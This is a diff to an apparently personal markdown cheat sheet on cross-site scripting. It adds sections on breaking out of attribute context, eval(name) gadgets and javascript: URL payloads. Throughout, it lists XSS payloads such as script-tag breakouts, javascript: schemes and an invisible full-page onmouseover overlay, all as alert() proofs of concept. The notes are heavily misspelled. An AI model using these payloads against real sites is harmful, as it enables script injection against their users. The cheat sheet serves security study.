@@ -1,5 +1,6 @@
 ### Table of Contents
-1. Execution
+1. CONTEXTUAL EXECUTION: What CONTEXT can I EXECUTE Inside?
+
 2. Bypass Filter/Sanitization
 3. Exploit Development
 4. Headers
@@ -34,17 +35,21 @@ jsnice.org
 ------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
 
+# 1. CONTEXTUAL EXECUTION: What CONTEXT can I EXECUTE Inside? 
 
-# 1. Execution
  + Note that things in `()` runs first like in math
  + Browser doesn't care about dangling _closing tags_ like `</textarea>`
   - or a lack of one `<iframe><iframe></iframe>`
 
-### Execution - Table of Contents 
+### Contextual Execution - Table of Contents 
  1. HTML Attributes
+   + Breaking Out of Context 
+   + Use `eval()`
+   + Using `regex`
+   
  2. URLs
  3. Event Handling
- 4. Inside JS
+ 4. Inside JS `<script>` Tags
  5. XS-Search
  6. Execution Without `script` Keyword 
 
@@ -52,7 +57,7 @@ jsnice.org
        ============================================================
 
 
-## [Execution] (1) - HTML Attributes
+## [Contextual Execution] (1) - HTML Attributes
 + Us: Html Atributs, Html Tags, & JS Functions
 ``` 
 Tempte:              | Example:
@@ -63,34 +68,56 @@ Tempte:              | Example:
  tag "value"         | <h1 class "hover-title" title="something">Hover</h1>
 ```
 
-+ Brk out Wit
+### Breaking Out of Context 
  1. ` - singequtoes:  `'(payload)`
  2. ` - doubl qutoes: `"(payload)`
  3. ace Charaters: `(space, \f, \n, \r, \t)`
 
-+ Exples
++ Examples
  - Bic: `"><sript>alert(document.domain)</script>`
  - Bic: `"</txtarea><script>alert(document.domain)</script>`
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+### Use `eval()`
+
+* Has an example: https://www.youtube.com/watch?v=eQFbG6CwwdI
+```Use_eval()
+<output name="alert(1)" onclick="eval(name)">X</output>
+                 v                     ^
+                 |                     |
+                 +---------------------+
+           `eval` grabs the tag value `name`
+          and puts it inside the `onclick` tag
+```
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+### Using `regex`
+
+* Good example: https://www.youtube.com/watch?v=eQFbG6CwwdI
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
      ===========================================================
 
 
-## [Execution] (2) - URLs
+## [Contextual Execution] (2) - URLs
 * Us: Html Atributes, Html Tags, JS Functions, URL Schemes
 * No that `jaascript:alert()` or `"javascript:alert()"` should work regardless of quotes
 
 + Pontial TagTargets 
- - Lk:   <a hef="{{input_from_url}}">Link</a>
- - iame: <ifrme src="{{input_from_url}}"></frame>
+ - Link:   <a href="{{input_from_url}}">Link</a>
+ - iFrame: <iframe src="{{input_from_url}}"></iframe>
  
-+ Exples:
- - Bic: `javacript:alert(document.domain)`
++ Examples:
+ - `javacript:alert(document.domain)`
 
 + Sale Result that pull from URL:
 
- - lation = 'avascript:alert()'
- - <rame src=avascript:alert()></iframe>
+ - location = 'javascript:alert()'
+ - <iframe src=javascript:alert()></iframe>
  - <href=javacript:alert()>Link></a>
  
 + `<>` Elemens is _NOT going to work_ cause it _doesn't host content_ from another webpage
@@ -99,7 +126,7 @@ Tempte:              | Example:
      ===========================================================
 
     
-## [Execution] (3) - Event Handling
+## [Contextual Execution] (3) - Event Handling
 * Us: CSS, Evnts, Event Handling, Html Attributes, JS Fucntions, URL Encoding
 * Secheat shet _xss-cheat-sheet.pdf_ for more
 
@@ -121,7 +148,8 @@ Tempte:              | Example:
  - C use `stye`                                                           v--- url encoding
  - Emple: `'omouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
                                                                           ^--- % is \x25
- - Sf-Delete style`: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
+                                                                          
+ - Sf-Delete style: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
   * n put thi  in between `onmouseover=` and `alert();`
   
  - Fl: `'onmoseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
@@ -130,7 +158,7 @@ Tempte:              | Example:
      ===========================================================
 
 
-## [Execution] (4) - Inside JS
+## [Contextual Execution] (4) - Inside JS `<script>` Tags
 * Us: JS Arras/comments/functions/numbers/strings/objects/operators/template literals
 * Brser will parse Html BEFORE running JS_
 * Th **assume you're input/source is INSIDE** `<script>` & `</script>`
@@ -183,10 +211,10 @@ Tempte:              | Example:
      ===========================================================
 
 
-## [Execution] (5) - XS-Search
+## [Contextual Execution] (5) - XS-Search
 [LiveOverflow]: https://www.youtube.com/watch?v=HcrQy0C-hEA
        
-## [Execution] (6) - Without the `script` Keyword
+## [Contextual Execution] (6) - Without the `script` Keyword
 
 + In the section: _2. Bypass Filter/Sanitization_ 
  - Look at this subsection: _[Bypassing] (2) - Bypass Filters_
